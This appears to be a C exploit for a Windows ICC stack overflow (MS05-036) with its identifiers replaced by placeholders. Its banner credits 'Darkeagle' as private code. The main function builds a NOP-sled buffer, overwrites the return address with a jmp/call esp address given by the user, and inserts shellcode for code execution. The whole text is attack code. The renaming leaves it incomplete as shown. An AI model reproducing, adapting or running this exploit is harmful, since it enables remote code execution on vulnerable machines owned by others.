
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {unsigned int writeable_add; unsigned int jmpADD; } ;
typedef int DWORD ;


 int VAR_0 ;
 int FUNC_0 (char*) ;
 int VAR_1 ;
 int FUNC_1 () ;
 int VAR_2 ;
 int FUNC_2 (int,unsigned int) ;
 int FUNC_3 (int ) ;
 int FUNC_4 () ;
 int FUNC_5 (int,int,unsigned int) ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_6 (char*,...) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_7 (char*,char*,long*) ;
 int VAR_7 ;
 unsigned int FUNC_8 (int ) ;
 int FUNC_9 (int,int ,unsigned int) ;
 int FUNC_10 (unsigned int) ;
 int VAR_8 ;
 TYPE_1__* VAR_9 ;

int FUNC_11(int VAR_10, char *VAR_11[])
{
int VAR_12=0, VAR_13=VAR_0, VAR_14=0;
int VAR_15 = 0;
unsigned int VAR_16 = FUNC_8(VAR_6);
unsigned int VAR_17 = VAR_7 - VAR_8 + 1 + VAR_16 ;
long VAR_18 = 0x00;

if (VAR_10 < 2) {
FUNC_6("\n\n");

FUNC_6("* Windows ICC stack overflow exploit (MS05-36)\n");
FUNC_6("* Code Execution Exploit\n");
FUNC_6("* (c) Darkeagle [ private code ]\n");
FUNC_6("* usage -> ms05-036 <target> (jmp/call esp)\n");
FUNC_4() ;
FUNC_3(0);
}

VAR_13=FUNC_0(VAR_11[1]);

if ( VAR_10 == 3 )
FUNC_7(VAR_11[2], "0x%x", &VAR_18);

FUNC_5(VAR_1 + VAR_8, 0x90,VAR_17);

*(DWORD*)(VAR_1 + VAR_4) = FUNC_10(VAR_9[VAR_13-1].writeable_add);
*(DWORD*)(VAR_1 + VAR_3) = FUNC_10(0x4);
if ( VAR_18 == 0x00 )
{
*(DWORD*)(VAR_1 + VAR_5) = FUNC_10(VAR_9[VAR_13-1].jmpADD);
} else {
*(DWORD*)(VAR_1 + VAR_5) = FUNC_10(VAR_18);
}
FUNC_9(VAR_1 + VAR_7, VAR_6, VAR_16);
FUNC_2(VAR_1 + VAR_7, VAR_16);

VAR_17 = (VAR_17 >> 2 << 2) + 4;
FUNC_6("current size: 0x%.8X\n",VAR_17);
*(DWORD*)(VAR_1 + VAR_2) = FUNC_10(VAR_17);

FUNC_1();

return 0;

}
